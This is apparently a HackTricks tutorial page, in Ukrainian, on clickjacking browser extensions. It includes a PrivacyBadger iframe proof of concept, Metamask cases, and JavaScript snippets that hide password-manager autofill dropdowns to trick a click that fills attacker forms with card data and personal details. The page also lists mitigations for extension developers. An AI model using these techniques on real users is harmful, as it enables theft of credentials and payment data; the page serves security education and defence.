# BrowExt - ClickJacking

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

Ця сторінка покаже, як зловживати вразливістю ClickJacking у браузерному розширенні.\
Якщо ви не знаєте, що таке ClickJacking, подивіться:

{{#ref}}
../clickjacking.md
{{#endref}}

Розширення містять файл **`manifest.json`**, і цей JSON-файл має поле `web_accessible_resources`. Ось що кажуть [the Chrome docs] про це:

> Ці ресурси будуть доступні на веб-сторінці через URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, який можна згенерувати за допомогою **`extension.getURL method`**. Allowlisted resources are served with appropriate CORS headers, so they're available via mechanisms like XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Поля `web_accessible_resources` у браузерному розширенні не просто доступні через веб; вони також виконуються з привілеями самого розширення. Це означає, що вони можуть:

- Змінювати стан розширення
- Завантажувати додаткові ресурси
- Взаємодіяти з браузером в певній мірі

Однак ця можливість створює ризик безпеки. Якщо ресурс у `web_accessible_resources` має будь-яку значну функціональність, нападник може вбудувати цей ресурс у зовнішню веб-сторінку. Нічого підозрюючі користувачі, що відвідують таку сторінку, можуть випадково активувати вбудований ресурс. Така активація може призвести до небажаних наслідків, залежно від дозволів і можливостей ресурсів розширення.

## PrivacyBadger Example

В розширенні PrivacyBadger була виявлена вразливість, пов'язана з тим, що директорія `skin/` була оголошена в `web_accessible_resources` таким чином (перегляньте оригінальний [blog post](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Ця конфігурація призвела до потенційної проблеми безпеки. Зокрема, файл `skin/popup.html`, який відображається при взаємодії з іконкою PrivacyBadger у браузері, міг бути вбудований всередину `iframe`. Таке вбудування можна використати, щоб обдурити користувачів і змусити їх ненавмисно натиснути на "Disable PrivacyBadger for this Website". Така дія компрометувала б приватність користувача, вимкнувши захист PrivacyBadger та потенційно піддаючи користувача підвищеному відстеженню. Візуальну демонстрацію цього експлойту можна переглянути у ClickJacking відео за посиланням [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Щоб усунути цю вразливість, був реалізований простий варіант вирішення: видалення `/skin/*` зі списку `web_accessible_resources`. Ця зміна ефективно знизила ризик, гарантуючи, що вміст директорії `skin/` не може бути доступний або маніпульований через `web_accessible_resources`.

Виправлення було простим: **remove `/skin/*` from the `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}
</style>

<div id="stuff">
<h1>Click the button</h1>
<button id="button">click me</button>
</div>

<iframe
src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Приклад Metamask

Тут можна знайти [**пост у блозі про ClickJacking у Metamask**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). У цьому випадку Metamask виправили вразливість, перевіряючи, що протокол, яким до неї звертаються, був **`https:`** або **`http:`** (наприклад, не **`chrome:`**):

<figure><img src="../../images/image (21).png" alt=""><figcaption></figcaption></figure>

**Ще один ClickJacking, виправлений** у розширенні Metamask полягав у тому, що користувачі могли **Click to whitelist**, коли сторінка підозрювалася у phishing через `“web_accessible_resources”: [“inpage.js”, “phishing.html”]`. Оскільки та сторінка була вразливою до Clickjacking, атакуючий міг зловживати цим, показуючи щось звичне, щоб змусити жертву без уваги натиснути для whitelist, а потім повернутися до phishing-сторінки, яка опиниться у whitelist.

## Приклад Steam Inventory Helper

Перегляньте наступну сторінку, щоб побачити, як **XSS** у розширенні браузера був пов'язаний із уразливістю **ClickJacking**:


{{#ref}}
browext-xss-example.md
{{#endref}}

---

## DOM-based Extension Clickjacking (Password Manager Autofill UIs)

Класичний extension clickjacking зловживає неправильно налаштованими `web_accessible_resources`, щоб iframe-ити привілейований HTML і спрямовувати кліки користувача. Новіший клас, DOM-based extension clickjacking, націлюється на dropdowns автозаповнення, які password managers інжектять безпосередньо в DOM сторінки, і використовує CSS/DOM трюки, щоб приховати або закрити їх від перегляду, залишаючи при цьому можливість взаємодії. Один примусово викликаний клік може вибрати збережений елемент і заповнити attacker-controlled поля чутливими даними.

### Модель загроз

- Атакуючий контролює веб-сторінку (або досягає XSS/subdomain takeover/cache poisoning на спорідненому домені).
- Жертва має встановлене та розблоковане розширення password manager (інколи автозаповнення працює навіть коли воно номінально заблоковане).
- Індукується принаймні один клік користувача (накладені cookie banners, діалоги, CAPTCHAs, ігри тощо).

### Потік атаки (manual autofill)

1. Інжектувати невидиму, але фокусовану форму (login/PII/credit-card поля).
2. Сфокусувати input, щоб викликати autofill dropdown розширення поруч із полем.
3. Приховати або закрити UI розширення, залишивши його інтерактивним.
4. Вирівняти правдоподібний елемент керування під прихованим dropdown, щоб змусити клік, який обере запис.
5. Зчитати заповнені значення з форми атакуючого та exfiltrate.

### How to hide the autofill UI

- Extension element
- Root element opacity (generic):
```js
// Reduce or nullify opacity of the extension root
// Works when the root element is attached in the page DOM
const root = document.querySelector('protonpass-root')
if (root) root.style.opacity = 0
```
- Дочірній елемент всередині open ShadowRoot (динамічний тег, приховати внутрішній iframe):
```js
// Find dynamic root like <protonpass-root-xyz> and hide its child iframe
const root = Array.from(document.querySelectorAll('*'))
.find(el => el.tagName.toLowerCase().startsWith('protonpass-root-'))
if (root?.shadowRoot) {
const frame = root.shadowRoot.querySelector('iframe')
if (frame) frame.style.cssText += 'opacity:0 !important;'
}
```
- Батьківський елемент
- BODY/HTML трюки з opacity, щоб зробити UI розширення невидимим, поки сторінка виглядає нормально (наприклад, фон для скріншота):
```js
// Hide full page, then reveal a tiny amount to keep clicks working
document.body.style.opacity = 0
// Optional: Show a screenshot/lookalike to avoid a blank screen
// document.documentElement.style.backgroundImage = 'url(website.png)'

// Inject a credit-card form and focus to trigger dropdown
/* create #cardform with #cardnumber, #expiry, #cvc */
document.getElementById('cardnumber').focus()
// Make body barely visible to allow user interaction
document.body.style.opacity = '0.001'

function getCardValues() {
const num = document.getElementById('cardnumber').value
const exp = document.getElementById('expiry').value
const cvc = document.getElementById('cvc').value
// exfiltrate via XHR/fetch/websocket
}
```
- Overlay
- Partial overlay: перекрийте все, крім кількох пікселів, щоб dropdown залишався клікабельним (переконайтесь, attacker overlay є останнім у DOM з max z-index, або використайте Top Layer).
- Full overlay using pointer-events:none so clicks pass through to the hidden dropdown; keep it persistent with the Popover API:
```html
<div id="overlay" popover style="pointer-events:none;">Cookie consent</div>
<script>
overlay.showPopover()
// Inject a personal data form and focus to trigger dropdown
/* create #personalform with #name/#email/#phone/... */
document.getElementById('name').focus()
function getData(){ /* read + exfil values on change */ }
</script>
```
### Позиціонування кліку жертви

- Fixed placement: розмістіть прихований випадаючий список під правдоподібним елементом керування, таким як “Accept cookies”, “Close” або прапорцем CAPTCHA.
- Follow-mouse: переміщуйте фокусоване поле вводу під курсор, щоб випадаючий список слідував за ним; періодично знову встановлюйте фокус, щоб один клік у будь-якому місці вибирав елемент:
```js
const f = document.getElementById('name')
document.addEventListener('mousemove', e => {
personalform.style = `top:${e.pageY-50}px;left:${e.pageX-100}px;position:absolute;`
// some managers hide the dropdown if focus is lost; refocus slowly
setTimeout(() => f.focus(), 100)
})
```
### Вплив і сценарії

- Сайт під контролем атакуючого: один примусовий клік може ексфільтрувати дані кредитної картки (number/expiry/CVC) та персональну інформацію (name, email, phone, address, DOB), які не обмежені доменом.
- Довірений сайт з XSS/subdomain takeover/cache poisoning: багаторазове викрадення облікових даних (username/password) та TOTP, оскільки багато менеджерів автозаповнення працюють через пов'язані піддомени/батьківські домени (наприклад, `*.example.com`).
- Passkeys: якщо RP не прив'язує WebAuthn challenges до сесії, XSS може перехопити підписане твердження; DOM-based clickjacking приховує passkey prompt, щоб викликати підтверджувальний клік користувача.

### Обмеження

- Потребує принаймні одного кліку користувача та достатньо точного вирівнювання пікселів (реалістичні перекриття роблять клік легко провокованим).
- Auto-lock/logout скорочує вікна експлуатації; деякі менеджери все ще виконують автозаповнення навіть у стані “locked”.

### Заходи для розробників розширень

- Рендерити інтерфейс автозаповнення у Top Layer (Popover API) або інакше забезпечити, щоб він розміщувався вище стеку сторінки; уникати покриття сторінкою-контролюваними перекриттями.
- Протидіяти підмінам CSS: віддавати перевагу Closed Shadow DOM і моніторити за допомогою `MutationObserver` підозрілі зміни стилів у коренях UI.
- Виявляти ворожі перекриття перед заповненням: перерахувати інші top-layer/popover елементи, тимчасово відключити `pointer-events:none` і використати `elementsFromPoint()` для виявлення оклюзії; закривати UI, якщо перекриття існують.
- Виявляти підозрілі зміни opacity або стилів `<body>`/`<html>` як до, так і після рендеру.
- Для проблем, пов'язаних з iframe: звужувати scope MV3 `web_accessible_resources` `matches` і уникати викриття HTML UI; для неминучого HTML відправляти `X-Frame-Options: DENY` або `Content-Security-Policy: frame-ancestors 'none'`.

## Посилання

- [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
- [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../../banners/hacktricks-training.md}}
